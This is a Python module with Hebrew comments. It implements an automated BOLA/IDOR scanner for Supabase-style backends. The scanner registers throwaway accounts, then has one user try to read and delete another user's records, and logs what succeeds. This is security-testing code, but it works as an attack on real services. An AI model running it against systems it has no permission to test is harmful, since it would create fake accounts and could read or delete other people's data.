# python/core/auth_bola_engine.py

import asyncio
import logging
import httpx
import random
import string
import time
from typing import Dict, Any, List

log = logging.getLogger("BolaEngine")
log.setLevel(logging.INFO)

class BolaIdorEngine:
    """
    מנוע אוטונומי לבדיקת חולשות BOLA (Broken Object Level Authorization) ו-IDOR.
    מתמחה בסביבות BaaS (Supabase / Firebase).
    """
    def __init__(self, target_url: str, anon_key: str, endpoints: List[str] = None):
        self.target_url = target_url.rstrip('/')
        self.anon_key = anon_key
        self.endpoints = endpoints or [] # טבלאות או נתיבי API שהתגלו
        self.users = {}
        self.findings = []
        
        # כותרות בסיס ל-Supabase/BaaS
        self.base_headers = {
            "apikey": self.anon_key,
            "Content-Type": "application/json",
            "Prefer": "return=representation"
        }

    async def run_attack(self) -> List[Dict[str, Any]]:
        """ניהול מחזור התקיפה השלם"""
        log.info(f"🎭 מתחיל מתקפת BOLA על {self.target_url}")
        
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            # 1. יצירת שני משתמשי קש (User A, User B)
            user_a = await self._create_dummy_user(client, "UserA")
            user_b = await self._create_dummy_user(client, "UserB")
            
            if not user_a or not user_b:
                log.warning("לא הצלחתי ליצור משתמשי קש. ייתכן שההרשמה סגורה או דורשת אימות אימייל אמיתי.")
                return self.findings

            # 2. הרצת מתקפות הצלבה על כל ה-Endpoints (הטבלאות) שהתגלו
            # נניח שקיבלנו רשימת טבלאות כמו ['profiles', 'documents', 'tickets']
            for endpoint in self.endpoints:
                await self._test_cross_user_access(client, endpoint, user_a, user_b)

        log.info(f"✅ מתקפת BOLA הסתיימה. נמצאו {len(self.findings)} חולשות BOLA/IDOR.")
        return self.findings

    async def _create_dummy_user(self, client: httpx.AsyncClient, label: str) -> Dict[str, str]:
        """רושם משתמש פיקטיבי במערכת ושולף את ה-JWT שלו"""
        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        email = f"attacker_{label.lower()}_{rand_str}@bypasstest.local"
        password = "PwnedPassword123!"

        log.info(f"📝 מנסה לרשום משתמש פיקטיבי ({label}): {email}")
        
        try:
            # ניסיון הרשמה סטנדרטי ל-Supabase
            res = await client.post(
                f"{self.target_url}/auth/v1/signup",
                headers=self.base_headers,
                json={"email": email, "password": password}
            )
            
            if res.status_code == 200:
                data = res.json()
                token = data.get("access_token") or (data.get("session", {})).get("access_token")
                user_id = data.get("user", {}).get("id")
                
                if token:
                    log.info(f"🔑 {label} נרשם בהצלחה וקיבל Token!")
                    return {"email": email, "token": token, "id": user_id}
                else:
                    log.info(f"⚠️ {label} נרשם, אבל לא קיבל Token (אולי דורש אימות אימייל).")
        except Exception as e:
            log.error(f"שגיאה ביצירת משתמש {label}: {e}")
            
        return None

    async def _test_cross_user_access(self, client: httpx.AsyncClient, table: str, user_a: dict, user_b: dict):
        """
        הליבה של BOLA:
        1. יוזר A כותב נתון פרטי.
        2. יוזר B מנסה לקרוא/למחוק אותו.
        """
        log.info(f"⚔️ בודק בידוד משתמשים (Tenant Isolation) על טבלה/Endpoint: {table}")
        
        # Headers של כל משתמש
        headers_a = {**self.base_headers, "Authorization": f"Bearer {user_a['token']}"}
        headers_b = {**self.base_headers, "Authorization": f"Bearer {user_b['token']}"}
        
        # שלב 1: משתמש A מנסה ליצור רשומה
        test_payload = {"title": f"Secret data of {user_a['email']}", "content": "Sensitive!"}
        
        try:
            res_a = await client.post(f"{self.target_url}/rest/v1/{table}", headers=headers_a, json=test_payload)
            
            if res_a.status_code not in (200, 201):
                # יוזר A בכלל לא יכול לכתוב לטבלה הזו, אז אין מה לבדוק BOLA
                return
                
            created_data = res_a.json()
            if not isinstance(created_data, list) or len(created_data) == 0:
                return
                
            record_id = created_data[0].get("id")
            if not record_id:
                return
                
            log.info(f"   [+] משתמש A הצליח ליצור רשומה עם ID: {record_id}")
            
            # שלב 2: משתמש B מנסה לקרוא את הרשומה של משתמש A (BOLA Read)
            res_b_read = await client.get(f"{self.target_url}/rest/v1/{table}?id=eq.{record_id}", headers=headers_b)
            
            if res_b_read.status_code == 200 and len(res_b_read.json()) > 0:
                log.warning(f"   [!] קריטי: משתמש B הצליח לקרוא את המידע של משתמש A!")
                self.findings.append({
                    "severity": "critical",
                    "category": "BOLA / IDOR",
                    "title": f"BOLA (Read) in table '{table}'",
                    "description": f"משתמש מחובר יכול לקרוא מידע פרטי של משתמשים אחרים דרך מניפולציה של ID.",
                    "evidence": [f"User A created ID: {record_id}", f"User B sent GET and received: {res_b_read.text[:100]}"]
                })

            # שלב 3: משתמש B מנסה למחוק את הרשומה של משתמש A (BOLA Delete)
            res_b_delete = await client.delete(f"{self.target_url}/rest/v1/{table}?id=eq.{record_id}", headers=headers_b)
            
            if res_b_delete.status_code in (200, 204):
                log.warning(f"   [!] קריטי: משתמש B הצליח למחוק את המידע של משתמש A!")
                self.findings.append({
                    "severity": "critical",
                    "category": "BOLA / IDOR",
                    "title": f"BOLA (Delete) in table '{table}'",
                    "description": f"משתמש מחובר יכול למחוק רשומות של משתמשים אחרים.",
                    "evidence": [f"DELETE /rest/v1/{table}?id=eq.{record_id} by User B -> {res_b_delete.status_code}"]
                })

        except Exception as e:
            pass # מתעלם משגיאות רשת נקודתיות כדי שהסריקה תמשיך


# ==========================================
# הרצה לבדיקה עצמאית של המודול
# ==========================================
if __name__ == "__main__":
    import sys
    target = "https://example-supabase-ai-app.com"
    anon = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." # תכניס פה anon key אמיתי לבדיקה
    
    engine = BolaIdorEngine(target, anon, endpoints=["profiles", "documents", "messages"])
    results = asyncio.run(engine.run_attack())
    
    print("\n--- תוצאות BOLA ---")
    import json
    print(json.dumps(results, indent=2, ensure_ascii=False))